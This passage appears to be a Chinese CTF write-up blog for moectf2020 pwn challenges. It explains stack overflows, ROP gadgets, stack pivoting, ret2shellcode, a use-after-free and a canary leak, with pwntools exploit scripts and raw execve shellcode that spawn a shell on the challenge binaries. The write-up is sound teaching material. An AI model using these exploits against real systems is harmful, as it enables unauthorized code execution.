+<p>其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。 </p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/" target="_blank" rel="noopener">ctf-wifi：Basic ROP</a></p>
+</blockquote>
+<p>首先在Linux下使用<code>checksec</code>指令分析，发现其开启了<strong>栈不可执行保护</strong></p>
+<p><img src="https://i.loli.net/2020/08/06/CmTilx3bQBschY8.png" alt="image.png"></p>
+<p>将程序拖入IDA分析，发现存在<code>gets</code>函数，很明显存在栈溢出</p>
+<p><img src="https://i.loli.net/2020/08/06/rfdg523GS6IOy7k.png" alt="image.png"></p>
+<p>我们尝试将断点下在<code>call _gets</code>，即<code>0x40087f</code>的地以计算偏移量</p>
+<p><img src="https://i.loli.net/2020/08/06/1pKo5GdSW3Jf42u.png" alt="image.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gdb</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> file rop1</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> b *0x40087f</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> r</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/08/06/oQREW8CdHIU59ai.png" alt="image.png"></p>
+<p>由<code>lea rax, [rbp-0x80]</code>我们可以看到该字符串为基于rbp的索引，故其相对于返回地址的偏移即为<code>0x80+8</code>，也就是<strong>128个字节再加上8字节的rbp</strong>，之后就是<strong>函数的返回地址</strong></p>
+<p>因此我们构造的payload基础模型应当是：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">target_addr = p64(addr_of_target)</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">128</span> + target_addr</span><br></pre></td></tr></table></figure>
+
+<p>然后我们就应该开始寻找需要用的<strong>gadget（程序小片段）</strong>了</p>
+<p>一般来说只要找到<code>system(&quot;/bin/sh&quot;)</code>就可以getshell了</p>
+<p>然而我们不难看出，程序中虽然存在着system函数，但是却是<code>system(&quot;eqqie&quot;)</code>。。。</p>
+<p><img src="https://i.loli.net/2020/08/06/ZGdgYATBi8L2fwm.png" alt="image.png"></p>
+<p>因此很明显我们不能直接返回到这个函数的地址上</p>
+<p>但是这也告诉我们有<code>system函数</code>的gadget，接下来只需要再找到<code>/bin/sh</code>字符串就可以凑出<code>system(&#39;/bin/sh&#39;)</code></p>
+<p>我们很容易在<code>.data</code>段找到<code>&quot;/bin/sh&quot;</code></p>
+<p><img src="https://i.loli.net/2020/08/06/8jlm6eZaWA1uMx5.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2020/08/06/IvTARLHcFo97XyS.png" alt="image.png"></p>
+<p>与32位程序所不同的是，64位程序参数<strong>首先通过rdi,rsi,rdx,rcx,r8,r9这六个寄存器进行传递</strong></p>
+<p>那么我们只需要先在<code>rdi寄存器</code>内写入<code>&quot;/bin/sh&quot;</code>的地址再调用system函数即可getshell</p>
+<p>但是我们直接找似乎找不到<code>pop rdi</code></p>
+<p>别慌www，在IDA内我们可以找到一段指令是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop r15</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/08/06/BgKRwnzp5yTH7l8.png" alt="image.png"></p>
+<p>按下<code>D</code>展开变成数据</p>
+<p><img src="https://i.loli.net/2020/08/06/XFxkV5w7uSKMmRG.png" alt="image.png"></p>
+<p>再按下<code>C</code>变成指令</p>
+<p><img src="https://i.loli.net/2020/08/06/MK2JW16oy3Db8FB.png" alt="image.png"></p>
+<p>得到指令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop rdi</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+
+<p>于是我们就成功得到了<strong>改变rdi寄存器的gadget的地址</strong></p>
+<p>接下来我们就可以构造payload了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'rop1'</span>)<span class="comment">#p = remote('sec.eqqie.cn',10004)</span></span><br><span class="line"></span><br><span class="line">pop_rdi = p64(<span class="number">0x400933</span>)</span><br><span class="line">sh_addr = p64(<span class="number">0x601070</span>)</span><br><span class="line">call_sys = p64(<span class="number">0x4007df</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">136</span> + pop_rdi + sh_addr + call_sys</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>连接服务器，使用我们的payload来getshell</p>
+<p><img src="https://i.loli.net/2020/08/06/yPLIicR9daTVWB8.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2020/08/06/1fT5rBh23v6sayX.png" alt="image.png"></p>
+<p>得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;67d14388-9052-4182-869c-5e5f0cdac4e5&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：也可以使用工具<code>ROPgadget</code>来寻找gadget</p>
+<p>Linux下，上面寻找gadget的步骤也可以如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary rop1 --string <span class="string">'/bin/sh'</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/08/06/XOmzb8AWo92nvBi.png" alt="image.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary rop1 --only <span class="string">'pop|ret'</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/08/06/tLToxVk8Cz19ARP.png" alt="image.png"></p>
+</blockquote>
+<blockquote>
+<p>参考资料：<a href="https://www.cnblogs.com/ichunqiu/p/9288935.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/9288935.html</a></p>
+</blockquote>
+<h2 id="ROP2-ret2text"><a href="#ROP2-ret2text" class="headerlink" title="ROP2 - ret2text"></a>ROP2 - ret2text</h2><p> <a href="/download/moectf2020/pwn/rop2/rop2"点击此处下载原题"">点击下载-rop2</a> </p>
+<p>首先使用<code>checksec</code>指令，发现其存在<strong>栈不可执行保护</strong></p>
+<p><img src="https://i.loli.net/2020/08/06/HDUg72BPC94AzJO.png" alt="image.png"></p>
+<p>拖进IDA，我们可以看到这一题和ROP1基本上没有太大的不同，都是直接存在gets函数的溢出漏洞</p>
+<p><img src="https://i.loli.net/2020/08/06/CYwqLfMRsyBxHK1.png" alt="image.png"></p>
+<p>以及<code>system</code>函数的gadget和<code>pop rdi</code>的gadget</p>
+<p><img src="https://i.loli.net/2020/08/06/tHY6GJM3NWE8jUk.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2020/08/06/mLMFVgjHt5DzBas.png" alt="image.png"></p>
+<p>不同的是，这一次并没有给我们预留下可以利用的<code>&quot;/bin/sh&quot;</code>字符串</p>
+<p><img src="https://i.loli.net/2020/08/06/BsmoxyjT8bOnvuh.png" alt="image.png"></p>
+<p>那么我们是否可以手动读入<code>/bin/sh</code>字符串呢？答案是肯定的</p>
+<p>首先存在<code>gets()</code>函数可以读入字符串</p>
+<p><img src="https://i.loli.net/2020/08/09/vxIF8c1b4ATqtQW.png" alt="image.png"></p>
+<p>其次我们在IDA中按下<code>CTRL + S</code>，可以看到存在一个可以供我们读写的<code>.bss</code>段</p>
+<p><img src="https://i.loli.net/2020/08/09/hdC8S9FJGPBUbQl.png" alt="image.png"></p>
+<p>那么我们只需要将<code>/bin/sh</code>字符串读到这个段上，再将之作为<code>system</code>函数的参数即可<code>getshell</code></p>
+<p>那么我们可以构造payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">'rop2'</span>)</span><br><span class="line">gets_addr = p64(e.symbols[<span class="string">'gets'</span>])</span><br><span class="line">sys_addr = p64(e.symbols[<span class="string">'system'</span>])</span><br><span class="line">pop_rdi = p64(<span class="number">0x400933</span>)</span><br><span class="line">bss_addr = p64(<span class="number">0x601080</span>)<span class="comment">#也可以用 e.bss() 快速获取可读写.bss段地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">136</span> + pop_rdi + bss_addr + gets_addr + pop_rdi + bss_addr + sys_addr</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'rop2'</span>)<span class="comment">#p = remote('sec.eqqie.cn',10005)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>连接服务器，发送我们的payload，即可getshell</p>
+<p><img src="https://i.loli.net/2020/08/09/fIoZyxE7F5biUQz.png" alt="image.png"></p>
+<p>得到flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;d44bc3cb-471b-4906-822b-ea5cb32c4acb&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Tips:</p>
+<p>pwntools里的ELF模块可以帮助我们快速找到一些需要的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#basic usage</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e = ELF(<span class="string">'file_name'</span>)	<span class="comment"># name of the file you're going to pwn</span></span><br><span class="line"></span><br><span class="line">e.symbols[<span class="string">'func_name'</span>]	<span class="comment"># to get the address of function-calling instruction quickly</span></span><br><span class="line"></span><br><span class="line">e.bss()					<span class="comment"># to get the address of a readable and writable </span></span><br><span class="line">						<span class="comment"># bss address quickly</span></span><br><span class="line"></span><br><span class="line">e.plt[<span class="string">'func_name'</span>]		<span class="comment"># to get the address of function-calling instruction</span></span><br><span class="line">						<span class="comment"># of function in .plt table quickly</span></span><br><span class="line">						<span class="comment"># usually the same result with symbol['f_name']</span></span><br><span class="line">        </span><br><span class="line">e.got[<span class="string">'func_name'</span>]		<span class="comment"># similar with the former one, which used to get .got table</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="baby-migration-stack-migration-ret2shellcode"><a href="#baby-migration-stack-migration-ret2shellcode" class="headerlink" title="baby migration - stack migration + ret2shellcode"></a>baby migration - stack migration + ret2shellcode</h2><p> <a href="/download/moectf2020/pwn/baby_migration/baby_migration">点击下载-baby_migration</a> </p>
+<p>首先是惯例的<code>checksec</code></p>
+<p><img src="https://i.loli.net/2020/08/24/4HjdZqlBKp1fIrG.png" alt="image.png"></p>
+<p>四舍五入保护全关</p>
+<p>拖入IDA进行分析</p>
+<p><img src="https://i.loli.net/2020/08/24/vf4jkEraNHWARhq.png" alt="image.png"></p>
+<p>我们可以看到存在栈溢出，可供溢出字节为<code>66-0x30=18</code>个字节，也就是说基本上只够覆盖rbp（8字节）+返回地址（8字节），空间十分拥挤，同时程序里也没有能够直接利用的gadget</p>
+<p>但是我们可以观察到在<code>bss段</code>有极大的可读写空间</p>
+<p><img src="https://i.loli.net/2020/08/24/1Id5CqOT92ui4ZH.png" alt="image.png"></p>
+<p>故考虑<strong>栈迁移</strong>，将栈迁移到bss段再放上我们的shellcode</p>
+<p>构造exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x30</span></span><br><span class="line">bss = <span class="number">0x404060</span></span><br><span class="line">back_to_gets = <span class="number">0x4011c8</span></span><br><span class="line"></span><br><span class="line">sc = <span class="string">b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span></span><br><span class="line">payload1 = <span class="string">b'A'</span>*offset + p64(bss+<span class="number">500</span>) + p64(back_to_gets)</span><br><span class="line">payload2 = sc + <span class="string">b'A'</span>*(offset - len(sc)) + p64(bss+<span class="number">500</span>) + p64(bss+<span class="number">500</span>-offset)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./baby_migration'</span>)<span class="comment">#p = remote('sec.arttnba3.cn', 10002)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>运行脚本即得flag</p>
+<p><img src="https://i.loli.net/2020/08/24/gY1Fxk7GERTjSBr.png" alt="image.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;5tack_m1gr@ti0n_1s_e4sy!&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>以下内容来自<a href="https://arttnba3.cn" target="_blank" rel="noopener">arttnba3.cn</a>：</p>
+<p>如何将一个栈劫持到别的地方？栈迁移的运行原理究竟是？</p>
+<p>做了那么多的pwn题（<del>指moeCTF2020刚刚开始做</del>（👈把这个家伙拖出去🔨了）），我们都知道在构造栈溢出的rop链时不仅要算上栈原本所分配的空间的大小，还要算上<code>ebp/rbp</code>寄存器所占用的4/8个字节，之后才到函数的返回地址，这是因为在一个函数启动时，会先将ebp/rbp的值压入栈中，之后将指向栈顶的esp/rsp寄存器的值赋给ebp/rbp寄存器，随后通过ebp/rbp寄存器来实现对栈的访问</p>
+<p><img src="https://i.loli.net/2020/08/24/U8f5Y1CJrsdVT69.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2020/08/24/jQkcHxb5MgARspU.png" alt="image.png"></p>
+<p>同样的，有压栈同样就会有出栈来恢复ebp/rbp与esp/rsp的值，我们都知道在函数运行到末尾时，会执行<code>leave</code>，<code>retn</code>两条指令</p>
+<p><img src="https://i.loli.net/2020/08/24/v79Elx15bWXdyoZ.png" alt="image.png"></p>
+<p>其中<code>leave</code>指令便是用来恢复栈帧的指令，它等价于如下指令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;ebp &amp; esp in 32-bit</span><br><span class="line">mov rsp, rbp</span><br><span class="line">pop rbp</span><br></pre></td></tr></table></figure>
+
+<p>由于<strong>对栈的访问都是通过ebp/rbp进行的</strong>，那么我们不难想到，只要我们在溢出时<strong>覆写掉栈内储存的原ebp/rbp的值</strong>，<strong>在retn指令返回后程序所判定的栈基址其实就变成了我们所覆写上的那个地址</strong>，之后程序在调用栈上的变量的时候其实都是基于我们所覆写上的新的栈基址进行操作的了，相当于把栈劫持到另一个地方，所以又叫<strong>栈劫持</strong></p>
+</blockquote>
+<h2 id="Hard-shellcode-ret2shellcode"><a href="#Hard-shellcode-ret2shellcode" class="headerlink" title="Hard shellcode - ret2shellcode"></a>Hard shellcode - ret2shellcode</h2><p> <a href="/download/moectf2020/pwn/hard_shellcode/hard_shellcode"点击此处下载原题"">点击下载-hard_shellcode</a> </p>
+<p>首先是惯例的<code>checksec</code></p>
+<p><img src="https://i.loli.net/2020/08/09/hkzgUZj8rYPoFI3.png" alt="image.png"></p>
+<p>保护全关，似乎整挺好</p>
+<p>不过这题的分值比rop2还要高100分，小心为妙XD</p>
+<p>拖入IDA看看</p>
+<p><img src="https://i.loli.net/2020/08/09/GdmDsjEnXpBqobO.png" alt="image.png"></p>
+<p>我们可以看到，读入0x50个字节，buf大小为0x40，<strong>存在栈溢出</strong></p>
+<p><strong>但是溢出大小只有0x10个字节，甚至无法放下一段完整的能用以getshell的shellcode，算上覆盖掉RBP的八个字节，返回地址的八个字节后，我们一无所有XD</strong></p>
+<p>还是看看有没有什么可以利用的gadget吧XD</p>
+<p>我们不难找到在IDA中直接有一段代码标注着<code>_gadget</code>，看得出来这段代码很想被我们利用www（</p>
+<p><img src="https://i.loli.net/2020/08/09/FidYB2N85WspeDt.png" alt="image.png"></p>
+<blockquote>
+<p>注：找寻可利用的gadget也可以用工具ROPgadget，命令如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary hard_shellcode --ropchain</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2020/08/09/zw9PxaDdpCf4h5B.png" alt="image.png" style="zoom: 50%;" />
+</blockquote>
+<p>我们不难想到，当我们输入完0x50个字节时，程序运行到返回地址返回到某个代码段后，rsp指向返回地址的高一个字节</p>
+<p>若是返回至gadget：0x4000ea：</p>
+<p>执行push rbp后，<strong>rsp = 原rsp - 8</strong></p>
+<p>执行mov rbp, rsp; sub rsp, 8后， <strong>rsp = 原rsp-16</strong></p>
+<p>执行jmp rsp后<strong>程序会尝试执行rsp上的代码，即原rsp-16位置上的代码</strong></p>
+<p>这个位置便是我们<strong>输入时所覆盖掉的RBP的位置</strong></p>
+<p>那么我们在这个位置上<strong>便有8个字节的空间可以写上我们的shellcode</strong></p>
+<p>同时我们想到，<strong>前面还有64个字节的空间，完全可以装得下一段getshell的shellcode</strong></p>
+<p>我们只需要先在前面写上getshell，<strong>再在8个字节的空间中写入修改rsp的值并再次跳转至rsp即可getshell（rsp与我们的输入的偏移量是可知的）</strong></p>
+<p>故得exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line">sub_rsp = asm(<span class="string">'sub rsp, 64'</span>)</span><br><span class="line">jmp_rsp = asm(<span class="string">'jmp rsp'</span>)</span><br><span class="line"></span><br><span class="line">gadget_addr = p64(<span class="number">0x4000ea</span>)</span><br><span class="line"></span><br><span class="line">payload = sc + <span class="string">b'A'</span>*(<span class="number">64</span>-len(sc)) + sub_rsp + jmp_rsp + <span class="string">b'A'</span>*(<span class="number">8</span>-len(sub_rsp)-len(jmp_rsp)) + gadget_addr</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'hard_shellcode'</span>)<span class="comment">#p = remote('sec.eqqie.cn',10002)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>向服务器发送payload，成功getsgell</p>
+<p><img src="https://i.loli.net/2020/08/09/QwGlAhc5fd9rItp.png" alt="image.png"></p>
+<p>得到flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Ni_HA0_q1ang_a!&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="easycpp（已下线）-Use-After-Free"><a href="#easycpp（已下线）-Use-After-Free" class="headerlink" title="easycpp（已下线） - Use After Free"></a>easycpp（已下线） - Use After Free</h2><blockquote>
+<p>注：本题因为一些原因在比赛过程中下线了</p>
+</blockquote>
+<p> <a href="/download/minil/pwn/easycpp"点击此处下载原题"">点击下载-easycpp</a><br> <a href="/download/minil/pwn/libc.so.6"点击此处下载原题"">点击下载-libc.so.6</a> </p>
+<p>首先是惯例的<code>checksec</code></p>
+<p><img src="https://i.loli.net/2020/08/09/tpZQ1nE5oaGdsRX.png" alt="image.png"></p>
+<p>我们可以看到，和前面几题不同的是这个程序是一个32位的程序</p>
+<p>拖入IDA进行分析</p>
+<p><img src="https://i.loli.net/2020/08/09/TRhAl2OYk1vWLUn.png" alt="image.png"></p>
+<p>用到了一个名为<code>B</code>的类，我们先看看这个类都有些啥</p>
+<p>IDA中类B有一个构造函数<code>B()</code>和一个<code>print()</code>函数</p>
+<p><img src="https://i.loli.net/2020/08/09/oIvaelmuFLr24JY.png" alt="image.png"></p>
+<p>类B的构造函数如下：</p>
+<p><img src="https://i.loli.net/2020/08/09/s1t4V8f7k9JvLQT.png" alt="image.png"></p>
+<p>类B的构造函数首先调用了类A的构造函数，然后将变量_vptr_A设置为一个函数指针</p>
+<p>我们不难看到在0x80489E4位置上我们还需要再跳转一次到0x80488F2的位置，这个位置上有一个<code>B::print()</code>函数，故可知这是一个<strong>二级函数指针</strong></p>
+<p><img src="https://i.loli.net/2020/08/09/k7gyPQfNmvLeJCn.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2020/08/09/7ILSlb95q12Dfny.png" alt="image.png"></p>
+<p>我们再来看看类A的构造函数，如下：</p>
+<img src="https://i.loli.net/2020/08/09/thgBiFQcLl86mru.png" alt="image.png" style="zoom:50%;" />
+
+<p>类A的构造函数也是将变量<code>_vptr_A</code>设置为一个函数指针</p>
+<p>位于off_80489F0上的函数为<code>A::print()</code></p>
+<p><img src="https://i.loli.net/2020/08/09/5qF6acIEWUGOvZ7.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2020/08/09/NDidotkIqXPuHn7.png" alt="image.png"></p>
+<p>接下来是main函数的简单分析：</p>
+<p><img src="https://i.loli.net/2020/08/09/TRhAl2OYk1vWLUn.png" alt="image.png"></p>
+<p>v3、v4都是一个类型为<code>类 B</code>的指针</p>
+<p>首先<code>setvbuf()</code>函数将程序设置为无缓冲输入</p>
+<p>之后创建了一个类B的实例并将地址给到指针v3和v4</p>
+<p>之后将该实例内的变量<code>_vptr_A</code>的值设为0</p>
+<p>之后使用delete释放掉之前分配给v3、v4的内存</p>
+<p>之后<strong>从标准输入流读入1024个字节到buf</strong>（或许有操作空间？）</p>
+<p>之后调用<code>strbuf()</code>函数重新分配一段内存空间并将buf的值拷贝一份（当然最后并没有指针接收这一块内存，那么它会成为野内存吗？）</p>
+<p>最后<strong>重新调用v4的函数指针变量所指向的函数</strong></p>
+<p>那么我们在这里就可以发现一个漏洞：</p>
+<p>v3、v4所指向的内存空间被释放后v3、v4并没有被设置为NULL，在运行到strdup()函数时若是我们给到buf的输入长度在一定范围内，这一块内存空间会被堆管理器重新分配给strdup()函数，而之后又通过v4再次对这一块内存空间进行调用，很明显存在<strong>UAF（Use After Free）</strong>漏洞</p>
+<p>同时我们可以发现存在一个<code>backdoor()</code>函数直接调用了<code>system(&quot;&quot;/bin/sh&quot;)</code>，可以直接getshell</p>
+<p><img src="https://i.loli.net/2020/08/09/dPJUXZ6M9kx8RnN.png" alt="image.png"></p>
+<p>故我们只需要覆写掉函数指针所指的函数为backdoor()函数即可getshell</p>
+<p>构造二级指针的结构应为</p>
+<table>
+<thead>
+<tr>
+<th>buf</th>
+<th>buf+4</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>右边那一块的地址 -&gt;</td>
+<td>指向backdoor函数的地址</td>
+</tr>
+</tbody></table>
+<p>buf的地址如下：</p>
+<img src="https://img-blog.csdnimg.cn/20200809084003820.png" alt="image.png" style="zoom:50%;" />
+
+<p>故得exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'easycpp'</span>)<span class="comment">#p = remote('sec.eqqie.cn', 10007)</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x80487BB</span></span><br><span class="line">buf = <span class="number">0x804A0C0</span></span><br><span class="line"></span><br><span class="line">payload = p32(buf + <span class="number">4</span>) + p32(backdoor)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>向服务器发送payload，成功getsgell</p>
+<img src="https://i.loli.net/2020/08/09/eWifdr1K3v8Vxka.png" alt="image.png" style="zoom: 33%;" />
+
+<img src="https://i.loli.net/2020/08/09/6nQtRSwIdhX5peB.png" alt="image.png" style="zoom:50%;" />
+
+<p>得到flag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Ev3ryth1ng_c@n_be_cPP!&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>参考资料：</p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/" target="_blank" rel="noopener">ctf-wikf:Use After Free</a></p>
+</blockquote>
+<h2 id="baby-canary-canary-partial-overwrite-ret2libc"><a href="#baby-canary-canary-partial-overwrite-ret2libc" class="headerlink" title="baby canary - canary + partial overwrite + ret2libc"></a>baby canary - canary + partial overwrite + ret2libc</h2><p> [点击下载-baby_canary](/download/moectf2020/pwn/baby canary/baby_canary”点击此处下载原题”) </p>
+<p> [点击下载-libc.so.6](/download/moectf2020/pwn/baby canary/libc.so.6”点击此处下载原题”) </p>
+<p>首先是惯例的<code>checksec</code></p>
+<p><img src="https://i.loli.net/2020/08/29/wtnmcLYru4OTdgs.png" alt="image.png"></p>
+<p>除了地址随机化以外都开了，<strong>这也是唯一一道需要我们绕过canary保护的题</strong></p>
+<p>当然，看名字我们就知道这题肯定要考canary（</p>
+<p>首先拖入IDA进行分析</p>
+<p><img src="https://i.loli.net/2020/08/29/lAEmSNwFPbVyfop.png" alt="image.png"></p>
+<p>唯一的一个可塑的输出点是printf，我们考虑构造长度为<code>0x4c-0xc+1</code>的padding<strong>覆写掉canary的最高位字节\x00，这样程序在调用printf函数时便会输出canary的值</strong></p>
+<p>也就是<strong>partial overwrite</strong></p>
+<p>那么我们的第一条payload就出来了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">b'A'</span>*(<span class="number">0x4c</span><span class="number">-0xc</span>+<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>之后程序在输出完我们的输入之后还会再输出一些东西，而其中的前三个字节便是<strong>canary的低三位字节</strong></p>
+<p>故我们考虑使用以下代码得到canary：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line">canary = u32(<span class="string">'\x00'</span>+p.recv(<span class="number">3</span>))</span><br></pre></td></tr></table></figure>
+
+<p>得到了canary的值之后我们就可以尽情地溢出了</p>
+<p>同时我们可以发现不存在可以直接getshell的system函数或是/bin/sh字符串</p>
+<p><img src="https://i.loli.net/2020/08/29/ZN8SXe5KECDAnJI.png" alt="image.png"></p>
